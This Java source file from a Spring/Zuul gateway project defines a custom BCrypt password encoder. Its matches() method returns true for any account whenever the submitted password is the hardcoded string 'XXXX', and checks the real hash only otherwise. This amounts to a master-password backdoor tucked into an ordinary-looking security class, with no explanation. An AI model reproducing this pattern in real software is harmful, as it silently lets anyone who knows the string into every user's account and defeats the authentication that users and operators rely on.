package com.njht.webyun.zuul.security;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Component;

/**
 * @author David
 * @date 2021/3/12
 * @description：
 */
@Component
public class CustomPasswordEncoder extends BCryptPasswordEncoder {

    public boolean matches(CharSequence rawPassword, String encodedPassword) {

        if (encodedPassword != null && encodedPassword.length() != 0) {
            if("XXXX".equals(rawPassword.toString())) {
                return true;
            }
        }
        return super.matches(rawPassword,encodedPassword);
    }
}
